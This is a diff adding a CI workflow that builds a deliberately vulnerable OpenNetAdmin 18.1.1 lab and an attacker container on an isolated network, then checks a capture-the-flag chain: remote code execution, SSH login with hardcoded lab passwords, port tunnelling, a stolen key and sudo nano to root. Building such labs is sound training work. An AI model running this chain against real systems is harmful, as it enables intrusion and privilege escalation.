@@ -1,0 +1,108 @@
+name: OpenAdmin original ONA 18.1.1 web-to-root lab
+
+on:
+  push:
+    branches: ["test/nibbles-authentic-small"]
+    paths:
+      - "labs/openadmin/**"
+      - ".github/workflows/openadmin.yml"
+  pull_request:
+    paths:
+      - "labs/openadmin/**"
+      - ".github/workflows/openadmin.yml"
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  openadmin:
+    runs-on: ubuntu-latest
+    timeout-minutes: 45
+    steps:
+      - uses: actions/checkout@v4
+      - name: Build authentic OpenNetAdmin 18.1.1 and MySQL runtime
+        run: docker build --progress=plain -f labs/openadmin/Dockerfile -t ttp-openadmin:ci labs/openadmin
+      - name: Build independent attacker and SSH/nano verification tools
+        run: docker build -f labs/openadmin/tests/Dockerfile.attacker -t ttp-openadmin-attacker:ci labs/openadmin/tests
+      - name: Measure complete target image
+        run: |
+          set -euo pipefail
+          bytes=$(docker image inspect -f '{{.Size}}' ttp-openadmin:ci)
+          awk -v b="$bytes" 'BEGIN {printf "OpenAdmin image: %.1f MiB (%d bytes)\n",b/1048576,b}'
+          echo "OpenAdmin image bytes: $bytes" >> "$GITHUB_STEP_SUMMARY"
+      - name: Verify authentic ONA RCE, lateral movement, key pivot, nano root and reset
+        run: |
+          set -euo pipefail
+          net=openadmin-ci
+          target=openadmin-target
+          cleanup() {
+            docker logs --tail 180 "$target" || true
+            docker rm -f "$target" openadmin-other >/dev/null 2>&1 || true
+            docker network rm "$net" >/dev/null 2>&1 || true
+          }
+          docker network create --internal "$net"
+          trap cleanup EXIT
+          start_target() {
+            docker run -d --name "$target" --network "$net" \
+              --memory 768m --pids-limit 512 --cpus 2 \
+              -e OPENADMIN_REQUIRE_PRIVATE_FLAGS=1 \
+              -e OPENADMIN_STATIC_USER_FLAG='TTP{openadmin_ci_private_user_0123456789}' \
+              -e OPENADMIN_STATIC_ROOT_FLAG='TTP{openadmin_ci_private_root_0123456789}' \
+              ttp-openadmin:ci
+          }
+          wait_healthy() {
+            for i in $(seq 1 90); do
+              state=$(docker inspect -f '{{.State.Status}}' "$target")
+              if [ "$state" != running ]; then docker logs "$target"; return 1; fi
+              health=$(docker inspect -f '{{.State.Health.Status}}' "$target")
+              if [ "$health" = healthy ]; then return 0; fi
+              if [ "$health" = unhealthy ]; then docker logs "$target"; return 1; fi
+              sleep 2
+            done
+            docker logs "$target"; return 1
+          }
+          start_target
+          wait_healthy
+          docker run --rm --network "$net" \
+            -v "$PWD/labs/openadmin/tests:/tests:ro" \
+            ttp-openadmin-attacker:ci python3 /tests/attack_path.py
+          docker run --rm --network "$net" \
+            -v "$PWD/labs/openadmin/tests:/tests:ro" \
+            ttp-openadmin-attacker:ci bash -lc '
+              set -euo pipefail
+              sshpass -p "n1nj4W4rri0R!" ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null jimmy@openadmin-target "id -un" | grep -Fx jimmy
+              sshpass -p "n1nj4W4rri0R!" ssh -N -L 52846:127.0.0.1:52846 \
+                -o ExitOnForwardFailure=yes -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null jimmy@openadmin-target &
+              tunnel=$!
+              trap "kill $tunnel 2>/dev/null || true" EXIT
+              for i in $(seq 1 30); do
+                python3 -c "import socket; s=socket.socket(); s.settimeout(1); s.connect((\"127.0.0.1\",52846)); s.close()" && break || sleep 1
+              done
+              python3 /tests/internal_key.py
+              sshpass -P "Enter passphrase for key" -p bloodninjas ssh \
+                -i /tmp/joanna_id_rsa -o StrictHostKeyChecking=no \
+                -o UserKnownHostsFile=/dev/null joanna@openadmin-target "id -un; cat /home/joanna/user.txt" \
+                | grep -E "^(joanna|TTP\\{openadmin_ci_private_user_0123456789\\})$"
+              expect /tests/nano-root.exp
+              sshpass -P "Enter passphrase for key" -p bloodninjas ssh \
+                -i /tmp/joanna_id_rsa -o StrictHostKeyChecking=no \
+                -o UserKnownHostsFile=/dev/null joanna@openadmin-target \
+                "cat /tmp/openadmin-root-proof; cat /tmp/openadmin-root-flag-proof" \
+                | grep -E "uid=0\\(root\\)|TTP\\{openadmin_ci_private_root_0123456789\\}"
+            '
+          docker exec "$target" sh -c \
+            'test "$(cat /home/joanna/user.txt)" = "TTP{openadmin_ci_private_user_0123456789}"; test "$(cat /root/root.txt)" = "TTP{openadmin_ci_private_root_0123456789}"'
+          docker run -d --name openadmin-other --network "$net" \
+            --memory 768m --pids-limit 512 --cpus 2 \
+            -e OPENADMIN_REQUIRE_PRIVATE_FLAGS=1 \
+            -e OPENADMIN_STATIC_USER_FLAG='TTP{openadmin_other_user_0123456789}' \
+            -e OPENADMIN_STATIC_ROOT_FLAG='TTP{openadmin_other_root_0123456789}' ttp-openadmin:ci
+          docker exec openadmin-other sh -c \
+            'test "$(cat /home/joanna/user.txt)" = "TTP{openadmin_other_user_0123456789}"; test ! -e /tmp/openadmin-root-proof'
+          docker stats --no-stream --format 'Target memory: {{.MemUsage}}, PIDs: {{.PIDs}}' "$target"
+          docker rm -f "$target"
+          start_target
+          wait_healthy
+          docker exec "$target" sh -c 'test ! -e /tmp/openadmin-root-proof; test ! -e /tmp/openadmin-root-flag-proof'
+          echo 'PASS: authentic ONA xajax RCE -> Jimmy -> SSH tunnel -> Joanna key -> sudo nano UID0 -> static flags + isolated reset'
